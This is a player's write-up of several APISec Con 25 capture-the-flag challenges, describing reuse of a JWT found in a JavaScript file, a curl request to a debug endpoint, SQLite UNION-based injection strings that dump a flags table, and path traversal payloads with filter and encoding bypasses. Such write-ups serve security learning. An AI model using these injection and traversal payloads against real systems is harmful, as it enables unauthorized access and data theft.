# Apisec con 25 ctf - part 1

Assalamualaikum (peace be upon you) everyone.

I’m `Md. Fazle Rabbi`. Also known as `rahisec`

Recently, I participated in **APISec Con 25 CTF** and secured **9th place. My team’s name was `whoami` though it was a solo competition.**

I really enjoyed the competition, so I’ve decided to share my experience and write-ups with you all.

![image.png](images/image.png)

I started this competition 6 hours later and that time 1st, 2nd and 3rd already decided. However i joined in it and started to solve challenges one by one.

At first it feels easy, i easily solved 14 challenges out of 17. but some challenges were tricky. Honestly i enjoyed every single challenges. I learned many things during solving the challenges.

The most valuable lesson I realized from this competition is not to give up. At some challenges I reached at the dead end. but I knew something is here , I just need to figure it out.

and sometimes we need to think out of the box. I become frustrated several times . Then I started wrap up everything that I found, and started to analyze from the beginning. And then I found the missing piece of the puzzle. I realized I was wasting my time on the wrong approach.

Anyways. Lets start the show…

Assalamualaikum (peace be upon you) everyone!

I’m Md. Fazle Rabbi, also known online as rahisec 👨‍💻

Recently, I took part in the APISec Con 25 CTF and proudly secured 9th place! 🎉
My team name was whoami — which sounds mysterious, but let’s be real… it was just me. Yep, solo mode on. 😎

![image.png](images/image.png)

Now here’s the fun part — I joined the competition 6 hours late ⏰ (Because I didn’t realize the competition had already started, since it was my first time participating in the APISec Con CTF.). By the time I started, the 1st, 2nd, and 3rd places were already locked in. But hey, better late than never, right?

I jumped in and started grinding through the challenges one by one. At first, it felt pretty chill — I solved 14 out of 17 fairly smoothly. But then came the spicy ones 🌶️ — the kind that make you question your life choices.

Still, I genuinely enjoyed every single challenge. I learned a ton while solving them — new techniques, new bugs, and even some psychological endurance 😅.

Biggest lesson?
Never give up. Seriously. Some challenges had me staring into the void, thinking, "Is this even solvable?" But deep down, I knew: something’s there — I just had to dig deeper.

Sometimes, you really have to think outside the box. I hit walls, got frustrated, almost rage-quit a few times. But then I’d take a step back, gather everything I had, and look at it from a fresh angle. That’s when the “aha!” moments came. Most of the time, I was just stuck on the wrong approach.

Anyway, enough of the backstory…

Let’s dive into the write-ups and break down how I tackled each challenge!

# Category: **Shadow APIs**

## Challenge Name: **Undocumented**

![image.png](images/image%201.png)

![image.png](images/image%202.png)

after register and login

![image.png](images/image%203.png)

here we can create notes and nothing else.

in this type of challenge we usually need to bypass or access admin account or their notes. lets analyze the app.

In burp we can see several request is going on.

![image.png](images/image%204.png)

![image.png](images/image%205.png)

But at `api.min.js` catches my attention . there were a jwt token commented. and we can see several endpoints there.

![image.png](images/image%206.png)

I used that jwt to authenticate, and i got access to the debugger account.

![image.png](images/image%207.png)

tried to visit every endpoint that i found in the js, and `/debug` end point give us the flag.

![image.png](images/image%208.png)

```python
flag{h1dd3n_3ndp01nt5_4r3_n0t_s3cur3}
```

## Challenge Name: **API Obscura**

![image.png](images/image%209.png)

This challenge is same as previous. got a login and registration page , logged in, created note

![image.png](images/image%2010.png)

After Registering and login

![image.png](images/image%2011.png)

i checked every functionality but there’s nothing… so i opened my burp to see requests. and previous challenge we got jwt commented in js end point. lets check if we can find any in this challenge too..

![image.png](images/image%2012.png)

ya, got a jwt.

I tried to authenticate using this jwt like before.

![image.png](images/image%2013.png)

![image.png](images/image%2014.png)

nah, its not giving us flag…

so i checked the js file again, and i was i need to send a post request on `/debug` end point

debug post request in curl using debug token found in /api.min.js

```python
curl -X POST [https://api-obscura.ac25.apisecuniversity.com/api/debug](https://api-obscura.ac25.apisecuniversity.com/api/debug) \
-H "Content-Type: application/json" \
-H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRlYnVnIiwicm9sZSI6ImRlYnVnZ2VyIiwiaWF0IjoxNzQ3ODczOTEwLCJleHAiOjE3NTA0NjU5MTB9.VjFkiXQ0zCux6uG3eKuEqHB3yrgGMXmKvieAHhZotcQ" \
--data-raw '{"debug":true}'
```

or in burp. must add `Content-Type: application/json` other wise it won’t work

![image.png](images/image%2015.png)

got and endpoint of system log. after visiting it …

![image.png](images/image%2016.png)

we got another jwt.

according to js file, now we need to send request to `/api/admin`

![image.png](images/image%2017.png)

got the flag.

# Category : Injection Junction

## Challenge Name : **Break the Gate**

![image.png](images/image%2018.png)

![image.png](images/image%2019.png)

![image.png](images/image%2020.png)

## Challenge Name : **The Search for Secrets**

![image.png](images/image%2021.png)

The API endpoint looked something like this:

```

https://search-for-secrets.ac25.apisecuniversity.com/api/search?user=admin

```

It returned a simple JSON array, such as:

```json
[["admin", ""]]
```

![image.png](images/image%2022.png)

but if we search anything that do not exist, the output looks like that

![image.png](images/image%2023.png)

hmm, there is might be a query running in the background. so I appended a quote to break the query. it should through an error if it is a sql vulnerability:

```

https://search-for-secrets.ac25.apisecuniversity.com/api/search?user=admin'

```

and yeah, it returned a internal error — which is a good sign for us.

![image.png](images/image%2024.png)

lets balance it so that we can inject query on it.

```

https://search-for-secrets.ac25.apisecuniversity.com/api/search?user=admin' -- -

```

![image.png](images/image%2025.png)

![image.png](images/image%2026.png)

balanced perfectly. as i’m using burp so i need to use `+` sign to constract url

Lets see how many column it has.

```

https://search-for-secrets.ac25.apisecuniversity.com/api/search?user=admin' UNION SELECT 1 -- -

```

And it returned

```json
[
  [1, ""],
  ["admin", ""]
]
```

![image.png](images/image%2027.png)

but

![image.png](images/image%2028.png)

so we can assume there is only one column here.

---

Initially, I attempted to list tables using MySQL's standard `information_schema.tables`:

```sql

UNION SELECT table_name FROM information_schema.tables -- -

```

But I received no such tables.

![image.png](images/image%2029.png)

This was a huge hint: **MySQL and PostgreSQL wouldn't throw this exact message**, but **SQLite would**.

To confirm, I tried the SQLite equivalent:

```sql

UNION SELECT name FROM sqlite_master WHERE type='table' -- -

```

And it worked:

```json
json
CopyEdit
[["admin",""],["flags",""],["users",""]]

```

![image.png](images/image%2030.png)

Confirmed: the backend was running **SQLite**.

---

I targeted the `flags` table, since it's clearly where a flag would be hidden. But I needed column names first. In SQLite, the easiest way to get a table's structure is:

```sql

UNION SELECT sql FROM sqlite_master WHERE name='flags' -- -

```

It returned something like:

```json
[["CREATE TABLE flags(id INTEGER PRIMARY KEY, flag TEXT)", ""]]
```

![image.png](images/image%2031.png)

Now I knew the column name: `flag`.

---

Now for the final step. I used:

```

https://search-for-secrets.ac25.apisecuniversity.com/api/search?user=admin' UNION SELECT flag FROM flags -- -

```

And out came the sweet reward:

```json
json
CopyEdit
[["flag{SQL1_4P1_BYPA55_C0MP13T3!}",""],["admin",""]]

```

![image.png](images/image%2032.png)

```python
flag{SQL1_4P1_BYPA55_C0MP13T3!}
```

# Category : **Slash and Dash**

## Challenge Name : **Roads Less Traveled**

![image.png](images/image%2033.png)

![image.png](images/image%2034.png)

but actually it was not in root directory, it was in private directory.

![image.png](images/image%2035.png)

```python
flag{D1R_TR4V3RS4L_F1L3_4CC3SS}
```

## Challenge Name : **Filtered Fun**

![image.png](images/image%2036.png)

![image.png](images/image%2037.png)

here, it seems like filtering `../` so i doubled it. `....//`

![image.png](images/image%2038.png)

```python
flag{F1LT3R_BYP4SS_D0T_D0T_SL4SH}
```

## Challenge Name : Encoded Escapades

![image.png](images/image%2039.png)

description hint’s us, flag is in private directory.

![image.png](images/image%2040.png)

![image.png](images/image%2041.png)

just url encode the it.

![image.png](images/image%2042.png)

```python
flag{D0UBL3_3NC0D1NG_TR4V3R54L_M45T3R}
```
